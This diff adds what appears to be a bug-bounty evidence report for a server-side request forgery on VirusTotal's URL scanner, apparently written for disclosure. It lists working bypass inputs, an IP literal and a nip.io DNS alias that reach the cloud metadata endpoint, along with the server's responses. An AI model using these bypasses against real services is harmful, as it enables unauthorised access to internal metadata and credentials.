@@ -1,0 +1,56 @@
+VirusTotal SSRF Security Control Bypass — Evidence Report
+Generated : 2026-06-14T14:53:35Z
+Finding   : F001  |  CWE-918, CWE-183
+Target    : www.virustotal.com (TIER1, Google VRP in-scope)
+CVSS 3.1  : AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N = 5.0 Medium
+
+═══════════════════════════════════════════════════════
+ZERO-WAIT PROOF (Phase 0)
+═══════════════════════════════════════════════════════
+URL       : http://169.254.169.254/
+VT API ID : aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8
+Confirmed : last_http_response_headers.Server = 'Metadata Server for VM'
+Times sub : 1650
+
+═══════════════════════════════════════════════════════
+BYPASS 1: IP LITERAL
+═══════════════════════════════════════════════════════
+BLOCKED : http://metadata.google.internal/computeMetadata/v1/
+          → 400 InvalidArgumentError (VT filter active)
+BYPASSED: http://169.254.169.254/
+          → 200 OK + analysis ID (filter circumvented)
+
+═══════════════════════════════════════════════════════
+BYPASS 2: WILDCARD DNS ALIAS VIA nip.io
+═══════════════════════════════════════════════════════
+BYPASSED: http://169-254-169-254.nip.io/
+          → nip.io resolves to 169.254.169.254
+          → VT accepts (no DNS resolution before filter check)
+          → GCP IMDS responded: Server: Metadata Server for VM
+
+═══════════════════════════════════════════════════════
+IMDS EVIDENCE IN VT PUBLIC API
+═══════════════════════════════════════════════════════
+Endpoint  : GET /api/v3/urls/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8
+Key field : data.attributes.last_http_response_headers.Server
+Value     : Metadata Server for VM
+HTTP code : 200 (root path responds without Metadata-Flavor header)
+Submitted : 1650 times
+
+═══════════════════════════════════════════════════════
+JSON EVIDENCE FILES
+═══════════════════════════════════════════════════════
+  evidence-http-169-254-169-254-computeMetadata-.json
+  evidence-http-169-254-169-254-.json
+  evidence-http-169-254-169-254-latest-meta-data-.json
+  phase0-instant-verify.json
+  phase1a-hostname-blocked.json
+  phase1b-ip-literal-accepted.json
+  phase1c-wildcard-dns-accepted.json
+  phase2-2ac0e845.json
+  phase2-572261d7.json
+  phase2-dd114ca1.json
+  phase2-nip-2243432a.json
+  phase2-nip-779b2e87.json
+  phase3-live-crawl-result.json
+  phase3-live-submit.json
